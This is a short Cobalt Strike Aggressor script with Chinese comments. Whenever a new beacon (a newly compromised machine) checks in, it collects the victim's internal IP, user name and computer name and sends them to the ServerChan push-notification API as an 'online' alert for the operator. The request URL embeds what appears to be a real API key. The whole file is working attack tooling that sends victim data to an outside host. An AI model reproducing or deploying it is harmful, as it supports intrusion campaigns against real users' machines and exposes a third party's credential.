# 循环获取所有beacon
on beacon_initial {

    sub http_get {
        local('$output');
        $url = [new java.net.URL: $1];
        $stream = [$url openStream];
        $handle = [SleepUtils getIOHandle: $stream, $null];

        @content = readAll($handle);

        foreach $line (@content) {
            $output .= $line . "\r\n";
        }

        println($output);
    }
    #获取ip、计算机名、登录账号
    $internalIP = replace(beacon_info($1, "internal"), " ", "_");
    $userName = replace(beacon_info($1, "user"), " ", "_");
    $computerName = replace(beacon_info($1, "computer"), " ", "_");

    #get一下Server酱的链接
    $url = 'https://sctapi.ftqq.com/SCT66627TtaKu2QLUgYBQrRwZeZRPfGTw.send.send?text=CobaltStrike%e4%b8%8a%e7%ba%bf%e6%8f%90%e9%86%92&desp=%e4%bb%96%e6%9d%a5%e4%ba%86%e3%80%81%e4%bb%96%e6%9d%a5%e4%ba%86%ef%bc%8c%e4%bb%96%e8%84%9a%e8%b8%8f%e7%a5%a5%e4%ba%91%e8%b5%b0%e6%9d%a5%e4%ba%86%e3%80%82%0D%0A%0D%0Aip:'.$internalIP.'%0D%0A%0D%0A%e7%94%a8%e6%88%b7%e5%90%8d:'.$userName.'%0D%0A%0D%0A%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%90%8d:'.$computerName;

    http_get($url);

}
